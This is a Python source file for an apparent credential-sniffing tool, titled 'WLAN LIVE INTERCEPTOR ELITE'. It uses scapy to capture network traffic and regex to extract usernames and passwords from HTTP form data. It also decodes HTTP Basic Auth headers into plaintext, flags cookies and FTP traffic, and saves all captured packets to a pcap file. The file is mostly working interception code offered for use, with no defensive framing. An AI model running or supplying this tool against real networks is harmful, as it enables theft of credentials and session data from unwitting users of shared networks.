import os
import re
import base64
from datetime import datetime
from scapy.all import sniff, IP, TCP, UDP, conf, Raw, wrpcap
from rich.console import Console
from rich.table import Table
from rich.live import Live
from core.ui import draw_header

console = Console()
session_pcap = []
captured_intel = []


class SnifferEngine:
    def parse_http(self, load, src):
        """Deep inspection of HTTP for credential extraction."""
        decoded = load.decode('utf-8', errors='ignore')
        intel = []

        # 1. Credential Sniffing (Regex for standard forms)
        patterns = [
            r"(?i)(user|username|login|email|pass|password|pwd)=(.[^&^ ]*)"]
        for p in patterns:
            matches = re.findall(p, decoded)
            if matches:
                intel.append(
                    f"[bold red]CREDS: {matches[0][0]}={matches[0][1]}[/bold red]")

        # 2. Session Header Extraction
        if "Authorization: Basic" in decoded:
            auth = re.search(r"Authorization: Basic (.*)", decoded)
            if auth:
                try:
                    plain = base64.b64decode(auth.group(1)).decode()
                    intel.append(f"[bold red]BASIC AUTH: {plain}[/bold red]")
                except:
                    pass

        if "Cookie:" in decoded:
            intel.append("[yellow]Cookie Data Captured[/yellow]")
        return intel

    def callback(self, packet):
        if not packet.haslayer(IP):
            return

        session_pcap.append(packet)  # Save for evidence
        src, dst = packet[IP].src, packet[IP].dst
        info = []

        if packet.haslayer(TCP):
            port = packet[TCP].dport
            tag = f"[bold cyan]TCP/{port}[/bold cyan]"

            if packet.haslayer(Raw):
                load = packet[Raw].load
                if port in [80, 8080]:
                    tag = "[bold green]HTTP[/bold green]"
                    info.extend(self.parse_http(load, src))
                elif port == 21:
                    tag = "[bold red]FTP[/bold red]"
                elif any(kw in load.lower() for kw in [b"user", b"pass", b"key"]):
                    info.append("[yellow]Sensitive Keyword Found[/yellow]")

            if info:
                captured_intel.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "src": src, "dst": dst, "intel": " | ".join(info)
                })

    def generate_table(self):
        table = Table(title="Live Intelligence Stream",
                      expand=True, border_style="cyan")
        table.add_column("Time", style="dim")
        table.add_column("Source", style="green")
        table.add_column("Target", style="magenta")
        table.add_column("Intercepted Intel", style="white")
        for entry in captured_intel[-12:]:
            table.add_row(entry["time"], entry["src"],
                          entry["dst"], entry["intel"])
        return table

    def start(self):
        draw_header("WLAN LIVE INTERCEPTOR ELITE")
        ifaces = [i.name for i in conf.ifaces.data.values()]
        console.print(f"[dim]Available: {', '.join(ifaces)}[/dim]")
        iface = console.input(
            "[bold yellow]Select Interface: [/bold yellow]").strip() or conf.iface

        console.print(
            f"[*] Monitoring [bold cyan]{iface}[/bold cyan]... (Evidence: logs/capture.pcap)")
        if not os.path.exists("logs"):
            os.makedirs("logs")

        try:
            with Live(self.generate_table(), refresh_per_second=1) as live:
                def wrapped_cb(pkt):
                    self.callback(pkt)
                    live.update(self.generate_table())
                sniff(iface=iface, prn=wrapped_cb, store=0)
        except KeyboardInterrupt:
            if session_pcap:
                wrpcap("logs/capture.pcap", session_pcap)
                console.print(
                    f"\n[green][+] Captured {len(session_pcap)} packets to logs/capture.pcap[/green]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")


def start_sniffing():
    engine = SnifferEngine()
    engine.start()
